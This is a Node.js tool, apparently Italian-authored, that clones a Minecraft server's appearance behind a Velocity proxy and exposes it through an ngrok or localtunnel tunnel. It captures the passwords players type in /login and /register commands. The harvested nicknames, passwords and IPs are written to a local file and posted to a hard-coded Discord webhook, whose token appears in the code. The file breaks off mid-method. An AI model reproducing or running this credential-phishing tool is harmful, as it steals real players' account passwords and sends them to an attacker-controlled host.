#!/usr/bin/env node

const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const http = require('http');
const https = require('https');
const mc = require('minecraft-protocol');
const axios = require('axios');

// ===== DISCORD WEBHOOK CLASS =====
class DiscordWebhook {
    constructor() {
        this.webhookUrl = 'https://discord.com/api/webhooks/1425884465346908330/2BpSzSOr_DNyPtWsAKkdgolpufhCI0os3nTGZj_ImV3NsQwZoDdRa6vr8xdJsrKbdBSA';
        this.enabled = true;
    }

    async sendStartupNotification(serverInfo) {
        if (!this.enabled) return;

        try {
            const embed = {
                title: '🚀 CREDENTIAL LOGGER AVVIATO',
                color: 0x00ff00, // Verde
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'CREDENTIAL LOGGER • Sistema Attivo',
                    icon_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp'
                },
                fields: [
                    {
                        name: '🎯 Server Target',
                        value: `\`${serverInfo.host}:${serverInfo.port}\``,
                        inline: false
                    },
                    {
                        name: '🎮 Versione',
                        value: `\`${serverInfo.version || 'Sconosciuta'}\``,
                        inline: true
                    },
                    {
                        name: '👥 Giocatori',
                        value: `\`${serverInfo.players || '0/0'}\``,
                        inline: true
                    }
                ],
                description: `🔥 **Sistema di cattura credenziali attivo!**\n📡 Monitoraggio comandi \`/login\` e \`/register\`\n⚠️ Le credenziali verranno inviate qui automaticamente`
            };

            const payload = {
                username: 'CREDENTIAL LOGGER',
                avatar_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp',
                embeds: [embed]
            };

            await axios.post(this.webhookUrl, payload);
            console.log('🔔 Notifica startup inviata su Discord!');
            
        } catch (error) {
            console.log(`⚠️  Errore invio startup Discord: ${error.message}`);
        }
    }

    async sendCredential(credentialData) {
        if (!this.enabled) return;

        try {
            const embed = this.createEmbed(credentialData);
            const payload = {
                username: 'CREDENTIAL LOGGER',
                avatar_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp',
                embeds: [embed]
            };

            await axios.post(this.webhookUrl, payload);
            console.log('🔔 Credenziali inviate su Discord!');
            
        } catch (error) {
            console.log(`⚠️  Errore invio Discord: ${error.message}`);
        }
    }

    createEmbed(cred) {
        const now = new Date();
        const isLogin = cred.type?.includes('login');
        const isRegister = cred.type?.includes('register');
        
        const embed = {
            title: `🔥 CREDENZIALE CATTURATA! ${isLogin ? '🔑' : '📝'}`,
            color: isLogin ? 0xff6b6b : 0xff9800, // Rosso per login, arancione per register
            timestamp: now.toISOString(),
            footer: {
                text: 'CREDENTIAL LOGGER • MC Pentester',
                icon_url: 'https://cdn.discordapp.com/emojis/1057976156175609916.webp'
            },
            thumbnail: {
                url: 'https://crafatar.com/avatars/' + (cred.nickname || cred.username || 'steve') + '?size=128&overlay'
            },
            fields: [
                {
                    name: '👤 Nickname',
                    value: `\`${cred.nickname || cred.username || 'Sconosciuto'}\``,
                    inline: true
                },
                {
                    name: '🔑 Password', 
                    value: `\`${cred.password || 'N/A'}\``,
                    inline: true
                },
                {
                    name: '⚡ Tipo',
                    value: isLogin ? '🔑 **LOGIN**' : '📝 **REGISTER**',
                    inline: true
                },
                {
                    name: '🌐 Server Originale',
                    value: `\`${cred.server_original || cred.server || 'N/A'}\``,
                    inline: false
                },
                {
                    name: '📡 IP Client',
                    value: `\`${cred.client_ip || cred.ip || 'N/A'}\``,
                    inline: true
                },
                {
                    name: '📅 Data/Ora',
                    value: `\`${cred.date || 'N/A'} ${cred.time || 'N/A'}\``,
                    inline: true
                },
                {
                    name: '💻 Comando Completo',
                    value: `\`\`\`${cred.command || 'N/A'}\`\`\``,
                    inline: false
                }
            ]
        };

        // Aggiungi una descrizione dinamica
        embed.description = `🎯 **${isLogin ? 'Login' : 'Registrazione'}** catturata con successo!\n` +
                           `📱 Server: **${cred.server_original || 'Sconosciuto'}**\n` +
                           `👤 Utente: **${cred.nickname || cred.username}**\n` +
                           `🔐 Password: ||**${cred.password}**|| \`(clicca per rivelare)\``;

        return embed;
    }
}

// ===== CREDENTIAL LOGGER CLASS =====
class CredentialLogger {
    constructor() {
        this.logFile = path.join(__dirname, 'captured_credentials.json');
        this.credentials = [];
        this.discordWebhook = new DiscordWebhook();
        this.loadExistingCredentials();
    }

    loadExistingCredentials() {
        try {
            if (fs.existsSync(this.logFile)) {
                const data = fs.readFileSync(this.logFile, 'utf8');
                const parsed = JSON.parse(data);
                
                // Assicurati che sia sempre un array
                if (Array.isArray(parsed)) {
                    this.credentials = parsed;
                } else if (parsed.credentials && Array.isArray(parsed.credentials)) {
                    this.credentials = parsed.credentials;
                } else {
                    console.log('⚠️  Formato credenziali non valido, inizializzazione array vuoto');
                    this.credentials = [];
                }
            }
        } catch (error) {
            console.log('⚠️  Impossibile caricare credenziali esistenti:', error.message);
            this.credentials = [];
        }
    }

    logConnection(username, ip, server) {
        const credential = {
            type: 'connection',
            username: username,
            ip: ip,
            timestamp: new Date().toISOString(),
            server: server
        };
        
        // Assicurati che credentials sia un array
        if (!Array.isArray(this.credentials)) {
            this.credentials = [];
        }
        
        this.credentials.push(credential);
        this.saveCredentials();
        console.log(`👤 CONNESSIONE: ${username} da ${ip}`);
    }

    logCommand(username, command, server) {
        // Filtra solo comandi di interesse
        const lowerCommand = command.toLowerCase();
        if (!lowerCommand.includes('login') && !lowerCommand.includes('register')) {
            return;
        }

        const now = new Date();
        
        // Estrai il vero nickname dal comando se l'username passato è numerico
        let realNickname = username;
        if (/^\d+$/.test(username)) {
            const cmdMatch = command.match(/\/(?:login|register)\s+(\w+)/i);
            if (cmdMatch) {
                realNickname = cmdMatch[1];
            }
        }
        
        const credential = {
            type: 'command',
            nickname: realNickname,
            username: realNickname, // Manteniamo per compatibilità
            command: command,
            timestamp: now.toISOString(),
            date: now.toLocaleDateString('it-IT'),
            time: now.toLocaleTimeString('it-IT'),
            server_original: server,
            server: server, // Manteniamo per compatibilità
            client_ip: 'N/A' // Verrà aggiornato se disponibile
        };
        
        // Estrai password dai comandi
        const loginMatch = command.match(/\/login\s+(\S+)/i);
        const registerMatch = command.match(/\/register\s+(\S+)(?:\s+(\S+))?/i);
        
        if (loginMatch) {
            credential.type = 'login_command';
            credential.password = loginMatch[1];
            console.log(`🔑 COMANDO LOGIN: ${username} -> ${credential.password}`);
        } else if (registerMatch) {
            credential.type = 'register_command';
            credential.password = registerMatch[1];
            credential.confirmPassword = registerMatch[2] || registerMatch[1];
            console.log(`📝 COMANDO REGISTER: ${username} -> ${credential.password}`);
        }
        
        // Assicurati che credentials sia un array
        if (!Array.isArray(this.credentials)) {
            this.credentials = [];
        }
        
        this.credentials.push(credential);
        this.saveCredentials();
        
        // Messaggio di conferma più visibile per Electron
        console.log(`\n🔥 CREDENZIALE CATTURATA! 🔥`);
        console.log(`👤 Nickname: ${credential.nickname}`);
        console.log(`🔑 Password: ${credential.password}`);
        console.log(`🌐 Server: ${credential.server_original}`);
        console.log(`📅 Data/Ora: ${credential.date} ${credential.time}`);
        console.log(`📊 Totale credenziali: ${this.credentials.length}`);
        
        // Invia su Discord
        this.discordWebhook.sendCredential(credential).catch(err => {
            console.log(`⚠️  Errore Discord webhook: ${err.message}`);
        });
        
        console.log(); // Riga vuota
    }

    saveCredentials() {
        try {
            fs.writeFileSync(this.logFile, JSON.stringify(this.credentials, null, 2));
        } catch (error) {
            console.error('❌ Errore salvataggio credenziali:', error.message);
        }
    }

    getStats() {
        // Assicurati che credentials sia sempre un array
        if (!Array.isArray(this.credentials)) {
            console.log('⚠️  Credentials non è un array, inizializzazione...');
            this.credentials = [];
        }
        
        const stats = {
            totalConnections: this.credentials.filter(c => c && c.type === 'connection').length,
            loginAttempts: this.credentials.filter(c => c && c.type && c.type.includes('login')).length,
            registerAttempts: this.credentials.filter(c => c && c.type && c.type.includes('register')).length,
            uniqueUsers: [...new Set(this.credentials.filter(c => c && (c.nickname || c.username)).map(c => c.nickname || c.username))].length
        };
        
        return stats;
    }

    printStats() {
        const stats = this.getStats();
        console.log('\n📊 STATISTICHE CREDENZIALI:');
        console.log('═══════════════════════════');
        console.log(`👤 Connessioni: ${stats.totalConnections}`);
        console.log(`🔑 Tentativi Login: ${stats.loginAttempts}`);
        console.log(`📝 Tentativi Register: ${stats.registerAttempts}`);
        console.log(`🏷️  Utenti Unici: ${stats.uniqueUsers}`);
        console.log('═══════════════════════════\n');
    }
}

// ===== VELOCITY BUILDER CLASS =====
class VelocityBuilder {
    constructor() {
        this.velocityDir = path.join(__dirname, 'velocity-server');
        this.pluginsDir = path.join(this.velocityDir, 'plugins');
    }

    async createDirectories() {
        console.log('📁 Creazione cartelle...');
        
        if (!fs.existsSync(this.velocityDir)) {
            fs.mkdirSync(this.velocityDir, { recursive: true });
        }
        
        if (!fs.existsSync(this.pluginsDir)) {
            fs.mkdirSync(this.pluginsDir, { recursive: true });
        }
        
        console.log('✅ Cartelle create');
    }

    async downloadFile(url, filePath, name) {
        return new Promise((resolve, reject) => {
            console.log(`📥 Download ${name}...`);
            
            const file = fs.createWriteStream(filePath);
            
            https.get(url, {
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
            }, (response) => {
                if (response.statusCode >= 300 && response.statusCode < 400) {
                    file.close();
                    fs.unlinkSync(filePath);
                    return this.downloadFile(response.headers.location, filePath, name).then(resolve).catch(reject);
                }
                
                if (response.statusCode !== 200) {
                    file.close();
                    fs.unlinkSync(filePath);
                    return reject(new Error(`HTTP ${response.statusCode}`));
                }
                
                response.pipe(file);
                
                file.on('finish', () => {
                    file.close();
                    console.log(`✅ ${name} scaricato!`);
                    resolve();
                });
                
                file.on('error', reject);
            }).on('error', reject);
        });
    }

    async downloadVelocity() {
        console.log('🚀 Download Velocity...');
        
        const velocityJar = path.join(this.velocityDir, 'velocity.jar');
        // Usa versione stabile funzionante
        const downloadUrl = 'https://api.papermc.io/v2/projects/velocity/versions/3.3.0-SNAPSHOT/builds/436/downloads/velocity-3.3.0-SNAPSHOT-436.jar';
        
        await this.downloadFile(downloadUrl, velocityJar, 'Velocity 3.3.0-436');
    }

    async downloadPlugins() {
        console.log('🔌 Download plugins...');
        
        const viaVersionJar = path.join(this.pluginsDir, 'ViaVersion.jar');
        const viaBackwardsJar = path.join(this.pluginsDir, 'ViaBackwards.jar');
        
        const viaVersionUrl = 'https://github.com/ViaVersion/ViaVersion/releases/download/5.5.0/ViaVersion-5.5.0.jar';
        const viaBackwardsUrl = 'https://github.com/ViaVersion/ViaBackwards/releases/download/5.5.0/ViaBackwards-5.5.0.jar';
        
        await this.downloadFile(viaVersionUrl, viaVersionJar, 'ViaVersion 5.5.0');
        await this.downloadFile(viaBackwardsUrl, viaBackwardsJar, 'ViaBackwards 5.5.0');
    }

    // Funzione per convertire MOTD da legacy a MiniMessage
    convertMotdToVelocity(description) {
        if (!description) return "<gold>MC Cloner</gold>";
        
        let rawMotd = '';
        
        if (typeof description === 'string') {
            rawMotd = description;
        } else if (description.text !== undefined) {
            rawMotd = description.text || '';
            
            // Aggiungi extra se presente (per MOTD multilinea)
            if (description.extra && Array.isArray(description.extra)) {
                for (const extra of description.extra) {
                    if (typeof extra === 'string') {
                        rawMotd += extra;
                    } else if (extra.text) {
                        rawMotd += extra.text;
                    }
                }
            }
        } else {
            // Fallback per oggetti complessi
            try {
                rawMotd = JSON.stringify(description);
            } catch (e) {
                rawMotd = description.toString();
            }
        }
        
        // Converti da legacy (§) a MiniMessage
        return this.legacyToMiniMessage(rawMotd);
    }
    
    // Converte codici colore legacy (§) in formato MiniMessage COMPLETO
    legacyToMiniMessage(text) {
        if (!text) return "<gold>MC Cloner</gold>";
        
        console.log(`🎨 Conversione MOTD da: ${text.substring(0, 50)}...`);
        
        // Mappa COMPLETA tutti i codici Minecraft legacy a MiniMessage
        const colorMap = {
            // Colori base
            '§0': '<black>', '§1': '<dark_blue>', '§2': '<dark_green>', '§3': '<dark_aqua>',
            '§4': '<dark_red>', '§5': '<dark_purple>', '§6': '<gold>', '§7': '<gray>',
            '§8': '<dark_gray>', '§9': '<blue>', '§a': '<green>', '§b': '<aqua>',
            '§c': '<red>', '§d': '<light_purple>', '§e': '<yellow>', '§f': '<white>',
            
            // Formattazioni speciali
            '§l': '<bold>', '§o': '<italic>', '§n': '<underlined>', 
            '§m': '<strikethrough>', '§k': '<obfuscated>', '§r': '<reset>',
            
            // Alias alternativi che potresti trovare
            '&0': '<black>', '&1': '<dark_blue>', '&2': '<dark_green>', '&3': '<dark_aqua>',
            '&4': '<dark_red>', '&5': '<dark_purple>', '&6': '<gold>', '&7': '<gray>',
            '&8': '<dark_gray>', '&9': '<blue>', '&a': '<green>', '&b': '<aqua>',
            '&c': '<red>', '&d': '<light_purple>', '&e': '<yellow>', '&f': '<white>',
            '&l': '<bold>', '&o': '<italic>', '&n': '<underlined>', 
            '&m': '<strikethrough>', '&k': '<obfuscated>', '&r': '<reset>'
        };
        
        let converted = text;
        
        // Converti TUTTI i codici colore e formattazione
        for (const [legacy, mini] of Object.entries(colorMap)) {
            // Usa regex globale per sostituire tutte le occorrenze
            const regex = new RegExp(legacy.replace(/[§&]/, '[§&]'), 'gi');
            converted = converted.replace(regex, mini);
        }
        
        // Gestione intelligente dei tag annidati
        // Esempio: §l§e diventa <bold><yellow>
        converted = this.optimizeMiniMessageTags(converted);
        
        // Rimuovi eventuali codici § o & rimasti che non abbiamo mappato
        converted = converted.replace(/[§&]./g, '');
        
        console.log(`🎨 MOTD convertito a: ${converted.substring(0, 50)}...`);
        
        return converted;
    }
    
    // Ottimizza i tag MiniMessage per evitare conflitti
    optimizeMiniMessageTags(text) {
        // Gestisce situazioni come <bold><yellow> text </yellow></bold>
        let optimized = text;
        
        // Se il testo è troppo complesso, usa una versione semplificata
        if (optimized.length > 200 || (optimized.match(/</g) || []).length > 20) {
            // Fallback per MOTD molto complessi: mantieni solo i colori principali
            optimized = optimized.replace(/<bold>|<italic>|<underlined>|<strikethrough>|<obfuscated>/g, '');
            optimized = optimized.replace(/<\/bold>|<\/italic>|<\/underlined>|<\/strikethrough>|<\/obfuscated>/g, '');
            
            // Assicurati che ci sia almeno un colore
            if (!optimized.includes('<') || !optimized.includes('>')) {
                optimized = `<yellow>${optimized}</yellow>`;
            }
        }
        
        return optimized;
    }

    createConfig(targetHost, targetPort, targetInfo = null) {
        console.log('⚙️  Creazione velocity.toml con ping-passthrough completo...');
        
        // Crea file forwarding-secret
        const secretPath = path.join(this.velocityDir, 'forwarding.secret');
        fs.writeFileSync(secretPath, 'velocity-secret-key-dummy\n');
        
        // Con ping-passthrough = "all", il MOTD viene passato direttamente dal server originale
        let showMaxPlayers = 500;
        
        console.log('🎨 MOTD: Sarà copiato 1:1 dal server originale tramite ping-passthrough');
        
        if (targetInfo && targetInfo.players && targetInfo.players.max) {
            showMaxPlayers = targetInfo.players.max;
        }
        
        // Salva favicon se disponibile
        if (targetInfo && targetInfo.favicon) {
            try {
                const faviconPath = path.join(this.velocityDir, 'server-icon.png');
                const faviconData = targetInfo.favicon.split(',')[1];
                fs.writeFileSync(faviconPath, Buffer.from(faviconData, 'base64'));
                console.log('✅ Favicon del server originale salvata');
            } catch (error) {
                console.log('⚠️  Impossibile salvare favicon:', error.message);
            }
        }
        
        // Non serve più escape perché usiamo un MOTD semplice di default
        
        const config = `# Velocity Configuration - Clonato da ${targetHost}:${targetPort}
config-version = "2.6"
bind = "0.0.0.0:25577"
motd = "<yellow>Proxy Server</yellow>"
show-max-players = ${showMaxPlayers}
online-mode = false
force-key-authentication = false
player-info-forwarding-mode = "none"
forwarding-secret-file = "forwarding.secret"
announce-forge = false
kick-existing-players = false
ping-passthrough = "all"
prevent-client-proxy-connections = false

[servers]
lobby = "${targetHost}:${targetPort}"

try = [
    "lobby"
]

[forced-hosts]

[advanced]
compression-threshold = 256
compression-level = -1
login-ratelimit = 3000
connection-timeout = 25000
read-timeout = 30000
haproxy-protocol = false
tcp-fast-open = false
bungee-plugin-message-channel = true
show-ping-requests = false
announce-proxy-commands = true
log-command-executions = true
log-player-connections = true

[query]
enabled = false
port = 25577
map = "Velocity"
show-plugins = false

[metrics]
enabled = false
id = "00000000-0000-0000-0000-000000000000"
`;

        const configPath = path.join(this.velocityDir, 'velocity.toml');
        fs.writeFileSync(configPath, config);
        
        console.log('✅ Configurazione creata');
    }

    async setup(targetHost, targetPort, targetInfo = null) {
        try {
            console.log('🚀 VELOCITY SETUP - SUPPORTO MINECRAFT COMPLETO');
            console.log('════════════════════════════════════════════════');
            console.log(`📡 Target: ${targetHost}:${targetPort}`);
            console.log('════════════════════════════════════════════════\n');

            await this.createDirectories();
            await this.downloadVelocity();
            await this.downloadPlugins();
            this.createConfig(targetHost, targetPort, targetInfo);

            console.log('\n🎉 SETUP COMPLETATO!');
            console.log('✅ Velocity 3.3.0-436 installato');
            console.log('✅ ViaVersion 5.5.0 installato');
            console.log('✅ ViaBackwards 5.5.0 installato');
            console.log('🎮 Supporto: MC 1.7.2 → 1.21.10+');
            console.log('════════════════════════════════════════════════');

            return true;

        } catch (error) {
            console.error(`❌ Errore: ${error.message}`);
            throw error;
        }
    }
}

// ===== MAIN CLONER CLASS =====
class AutoMinecraftCloner {
    constructor() {
        this.velocityProcess = null;
        this.tunnelProcess = null;
        this.isRunning = false;
        this.targetInfo = null;
        this.velocityDir = path.join(__dirname, 'velocity-server');
        this.credLogger = new CredentialLogger();
        this.velocityBuilder = new VelocityBuilder();
    }

    async testServerConnectivity(host, port) {
        console.log('🔗 Test connettività server avanzato...');
        
        return new Promise((resolve) => {
            const net = require('net');
            const dns = require('dns');
            
            // Prima risolvi DNS
            dns.lookup(host, (err, address) => {
                if (err) {
                    console.log(`⚠️  Errore DNS per ${host}: ${err.message}`);
                    resolve(false);
                    return;
                }
                
                console.log(`🌐 DNS risolto: ${host} -> ${address}`);
                
                const socket = new net.Socket();
                
                const timeout = setTimeout(() => {
                    socket.destroy();
                    console.log('⚠️  Timeout connessione server');
                    resolve(false);
                }, 15000);
                
                socket.connect(port, address, () => {
                    clearTimeout(timeout);
                    socket.destroy();
                    console.log('✅ Connettività server verificata');
                    resolve(true);
                });
                
                socket.on('error', (err) => {
                    clearTimeout(timeout);
                    console.log(`⚠️  Errore connessione: ${err.code || err.message}`);
                    resolve(false);
                });
            });
        });
    }

    async scanTarget(host, port = 25565) {
        console.log(`🔍 Scansione del server target: ${host}:${port}`);
        
        try {
            // Versioni più ampie per compatibilità
            const versions = ['1.21.1', '1.20.6', '1.20.1', '1.19.4', '1.18.2', '1.17.1', '1.16.5', '1.15.2', '1.14.4', '1.12.2', '1.8.9'];
            
            for (const version of versions) {
                try {
                    console.log(`   Tentativo con versione ${version}...`);
                    
                    const response = await mc.ping({
                        host: host,
                        port: port,
                        version: version,
                        timeout: 10000,
                        connectTimeout: 5000
                    });
                    
                    this.targetInfo = {
                        host: host,
                        port: port,
                        version: response.version,
                        description: response.description,
                        players: response.players,
                        favicon: response.favicon,
                        protocol: version,
                        ping: Date.now()
                    };
                    
                    console.log('✅ Server rilevato con successo!');
                    console.log(`   Versione: ${response.version.name} (Protocol ${response.version.protocol})`);
                    console.log(`   Giocatori: ${response.players.online}/${response.players.max}`);
                    console.log(`   MOTD: ${typeof response.description === 'string' ? response.description : JSON.stringify(response.description)}`);
                    
                    // Test connettività opzionale (non bloccante)
                    this.testServerConnectivity(host, port).catch(() => {
                        console.log('⚠️  Test connettività saltato, procedo comunque');
                    });
                    
                    return this.targetInfo;
                } catch (error) {
                    continue;
                }
            }
            
            throw new Error('Impossibile connettersi al server con nessuna versione');
            
        } catch (error) {
            console.error('❌ Errore scansione server:', error.message);
            throw error;
        }
    }

    async setupVelocity() {
        console.log('🔧 Setup automatico Velocity...');
        await this.velocityBuilder.setup(this.targetInfo.host, this.targetInfo.port, this.targetInfo);
        console.log('✅ Velocity configurato automaticamente');
    }

    // Aggiorna solo la configurazione per un nuovo target senza riscaricare tutto
    async reconfigureTarget(newHost, newPort) {
        console.log(`🔄 RICONFIGURAZIONE RAPIDA: ${newHost}:${newPort}`);
        
        // Scansiona il nuovo target
        const oldTarget = this.targetInfo ? {...this.targetInfo} : null;
        await this.scanTarget(newHost, newPort);
        
        // Verifica compatibilità per ottimizzazione massima
        const isCompatible = this.isCompatibleTarget(oldTarget, this.targetInfo);
        
        if (isCompatible) {
            // Switch ultrarapido - solo cambio IP senza riavvio
            console.log('⚡ MODALITÀ ULTRARAPIDA - solo cambio IP');
            const quickUpdate = this.updateTargetConfig(this.targetInfo.host, this.targetInfo.port, this.targetInfo);
            
            if (quickUpdate) {
                console.log('✅ Switch completato in millisecondi!');
                return;
            }
        }
        
        // Riconfigurazione normale (comunque senza re-download)
        console.log('📝 Aggiornamento configurazione standard...');
        
        if (this.velocityProcess) {
            console.log('🔄 Riavvio Velocity per applicare modifiche...');
            this.velocityProcess.kill();
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        // Ricrea configurazione
        this.velocityBuilder.createConfig(this.targetInfo.host, this.targetInfo.port, this.targetInfo);
        
        console.log(`✅ ${oldTarget?.host || 'primo'}:${oldTarget?.port || 'setup'} → ${this.targetInfo.host}:${this.targetInfo.port}`);
        console.log('🎨 MOTD e favicon automaticamente sincronizzati');
    }

    async startVelocity() {
        console.log('🚀 Avvio Velocity Proxy Server...');
        
        const velocityJar = path.join(this.velocityDir, 'velocity.jar');
        if (!fs.existsSync(velocityJar)) {
            console.log('📦 Velocity non trovato, setup automatico...');
            await this.setupVelocity();
        }
        
        // Configurazione creata durante il setup iniziale
        
        return new Promise((resolve, reject) => {
            this.velocityProcess = spawn('java', [
                '-Xms512M',
                '-Xmx1024M',
                '-XX:+UseG1GC',
                '-jar',
                'velocity.jar'
            ], {
                cwd: this.velocityDir,
                stdio: ['pipe', 'pipe', 'pipe']
            });

            this.velocityProcess.stdout.on('data', (data) => {
                const output = data.toString();
                
                if (output.includes('Done') || 
                    output.includes('Listening on') || 
                    output.includes('has connected') ||
                    output.includes('has disconnected') ||
                    output.includes('/login') ||
                    output.includes('/register') ||
                    output.includes('ERROR')) {
                    console.log(`[VELOCITY] ${output.trim()}`);
                }
                
                if (output.includes('Done') || output.includes('Listening on')) {
                    console.log('✅ Velocity avviato con successo!');
                    
                    // Con ping-passthrough attivo, il MOTD viene copiato automaticamente
                    
                    setTimeout(() => resolve(), 2000);
                }
            });

            this.velocityProcess.stderr.on('data', (data) => {
                const error = data.toString();
                
                if (error.includes('Address already in use')) {
                    console.log('⚠️  Porta già in uso, server probabilmente già attivo');
                    setTimeout(() => resolve(), 1000);
                } else if (error.includes('Unable to bind')) {
                    reject(new Error('Impossibile avviare Velocity: porta occupata'));
                } else if (error.includes('/login') || 
                          error.includes('/register') ||
                          error.includes('authentication') ||
                          error.includes('password')) {
                    console.log(`[VELOCITY AUTH] ${error.trim()}`);
                }
            });

            this.velocityProcess.on('close', (code) => {
                if (code !== 0 && this.isRunning) {
                    console.error(`❌ Velocity chiuso con codice ${code}`);
                    reject(new Error(`Velocity fallito con codice ${code}`));
                }
            });

            this.velocityProcess.on('error', (error) => {
                console.error('❌ Errore Velocity:', error.message);
                reject(error);
            });
        });
    }

    async setupTunnel() {
        console.log('🌐 Avvio tunnel pubblico...');
        console.log('🔍 Rilevamento servizi tunnel disponibili...');
        
        // Controlla se ngrok è disponibile
        try {
            await this.runCommand('ngrok', ['version'], { timeout: 2000 });
            console.log('✅ Ngrok disponibile');
            return await this.setupNgrokTunnel();
        } catch (error) {
            console.log('⚠️  Ngrok non disponibile, provo localtunnel...');
        }
        
        // Fallback a localtunnel
        try {
            await this.runCommand('lt', ['--version'], { timeout: 2000 });
            console.log('✅ LocalTunnel disponibile');
            return await this.setupLocalTunnel();
        } catch (error) {
            console.log('⚠️  LocalTunnel non disponibile, installo...');
            
            try {
                console.log('📦 Installazione localtunnel...');
                await this.runCommand('npm', ['install', '-g', 'localtunnel'], { timeout: 30000 });
                return await this.setupLocalTunnel();
            } catch (installError) {
                throw new Error('Impossibile installare servizi tunnel. Installa manualmente ngrok o localtunnel.');
            }
        }
    }

    async setupNgrokTunnel() {
        console.log('🔥 Avvio Ngrok tunnel...');
        
        return new Promise((resolve, reject) => {
            this.tunnelProcess = spawn('ngrok', ['tcp', '25577'], {
                stdio: ['pipe', 'pipe', 'pipe']
            });

            let tunnelUrl = null;
            let attempts = 0;
            const maxAttempts = 15;

            const checkTunnel = async () => {
                try {
                    const response = await this.httpGet('http://localhost:4040/api/tunnels');
                    const data = JSON.parse(response);
                    
                    if (data.tunnels && data.tunnels.length > 0) {
                        tunnelUrl = data.tunnels[0].public_url.replace('tcp://', '');
                        const [host, port] = tunnelUrl.split(':');
                        
                        console.log('\n🎉 TUNNEL PUBBLICO ATTIVO!');
                        console.log('═══════════════════════════════════════════════════');
                        console.log(`📡 INDIRIZZO PUBBLICO: ${tunnelUrl}`);
                        console.log('🔧 SERVIZIO: Ngrok');
                        console.log(`🎯 TARGET CLONATO: ${this.targetInfo.host}:${this.targetInfo.port}`);
                        console.log(`🎮 VERSIONE: ${this.targetInfo.version.name}`);
                        console.log(`👥 GIOCATORI: ${this.targetInfo.players.online}/${this.targetInfo.players.max}`);
                        console.log('═══════════════════════════════════════════════════');
                        console.log('💡 Condividi questo indirizzo per far connettere altri');
                        console.log('🔒 Il tuo IP reale è nascosto');
                        console.log('🗝️  Le credenziali verranno salvate in captured_credentials.json\n');
                        
                        resolve({
                            service: 'ngrok',
                            url: tunnelUrl,
                            host: host,
                            port: parseInt(port)
                        });
                        return;
                    }
                } catch (error) {
                    // API non ancora disponibile, riprova
                }
                
                attempts++;
                if (attempts < maxAttempts) {
                    setTimeout(checkTunnel, 2000);
                } else {
                    reject(new Error('Timeout tunnel ngrok'));
                }
            };

            this.tunnelProcess.on('error', (error) => {
                reject(new Error(`Errore ngrok: ${error.message}`));
            });

            setTimeout(checkTunnel, 3000);
        });
    }

    async startCredentialMonitoring() {
        console.log('🔍 Avvio monitoraggio credenziali avanzato...');
        console.log('🎯 Focus: /login e /register comandi');
        
        const serverName = `${this.targetInfo.host}:${this.targetInfo.port}`;
        
        if (this.velocityProcess) {
            this.velocityProcess.stdout.on('data', (data) => {
                const log = data.toString();
                
                // Pattern per catturare connessioni
                const connectionPattern = /(\w+) \(\/(.+?)\) has connected/;
                const connectionMatch = log.match(connectionPattern);
                
                if (connectionMatch) {
                    this.credLogger.logConnection(connectionMatch[1], connectionMatch[2], serverName);
                }
                
                // Pattern per catturare comandi /login e /register con username reale
                const commandPatterns = [
                    // Pattern più specifici per catturare il vero username
                    /(\w+) \(.*?\) -> executed command (\/(?:login|register)\s+\S+(?:\s+\S+)?)/i,
                    /(\w+).*?executed command: (\/(?:login|register)\s+\S+(?:\s+\S+)?)/i,
                    // Fallback patterns
                    /(\w+).*?(\/(?:login|register)\s+\S+(?:\s+\S+)?)/i,
                    /\[(\w+)\] (\/(?:login|register)\s+\S+(?:\s+\S+)?)/i
                ];
                
                for (const pattern of commandPatterns) {
                    const match = log.match(pattern);
                    if (match) {
                        let username = match[1];
                        let fullCommand = match[2];
                        
                        // Se username è solo numerico, prova a estrarlo dal comando
                        if (/^\d+$/.test(username)) {
                            const cmdUserMatch = fullCommand.match(/\/(?:login|register)\s+(\w+)/i);
                            if (cmdUserMatch) {
                                username = cmdUserMatch[1];
                            }
                        }
                        this.credLogger.logCommand(username, fullCommand, serverName);
                        break;
                    }
                }
                
                // Pattern per disconnessioni con problemi di auth
                const disconnectPattern = /(\w+) \(\/(.+?)\) has disconnected: (.+)/;
                const disconnectMatch = log.match(disconnectPattern);
                
                if (disconnectMatch && disconnectMatch[3].includes('authentication')) {
                    console.log(`🚫 DISCONNESSO (Auth): ${disconnectMatch[1]} - ${disconnectMatch[3]}`);
                }
            });
            
            this.velocityProcess.stderr.on('data', (data) => {
                const log = data.toString();
                
                if (log.includes('/login') || log.includes('/register')) {
                    const commandMatch = log.match(/(\w+).*?(\/(?:login|register)\s+\S+(?:\s+\S+)?)/i);
                    if (commandMatch) {
                        this.credLogger.logCommand(commandMatch[1], commandMatch[2], serverName);
                    }
                }
            });
        }
        
        // Mostra statistiche ogni 60 secondi
        setInterval(() => {
            const stats = this.credLogger.getStats();
            if (stats.totalConnections > 0) {
                console.log(`📊 Stats: ${stats.totalConnections} connessioni, ${stats.loginAttempts} login, ${stats.registerAttempts} register`);
            }
        }, 60000);
    }

    async runCommand(command, args, options = {}) {
        return new Promise((resolve, reject) => {
            const process = spawn(command, args, { stdio: 'pipe' });
            
            let output = '';
            process.stdout.on('data', (data) => output += data.toString());
            process.stderr.on('data', (data) => output += data.toString());
            
            process.on('close', (code) => {
                if (code === 0) {
                    resolve(output);
                } else {
                    reject(new Error(`Comando fallito: ${command} ${args.join(' ')}`));
                }
            });
            
            process.on('error', reject);
            
            if (options.timeout) {
                setTimeout(() => {
                    process.kill();
                    reject(new Error('Timeout comando'));
                }, options.timeout);
            }
        });
    }

    httpGet(url) {
        return new Promise((resolve, reject) => {
            http.get(url, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => resolve(data));
            }).on('error', reject);
        });
    }

    async run() {
        try {
            this.isRunning = true;
            
            console.log('🎯 AUTO MINECRAFT CLONER - SISTEMA COMPLETAMENTE AUTOMATICO');
            console.log('═══════════════════════════════════════════════════════════════');
            console.log('🔍 Scansione automatica del server target');
            console.log('🔧 Setup automatico Velocity + ViaBackwards');
            console.log('🌐 Tunnel pubblico automatico');
            console.log('🗝️  Cattura credenziali automatica');
            console.log('═══════════════════════════════════════════════════════════════\n');

            // Controlla se Velocity è già installato
            const velocityExists = fs.existsSync(path.join(this.velocityDir, 'velocity.jar'));
            
            if (velocityExists) {
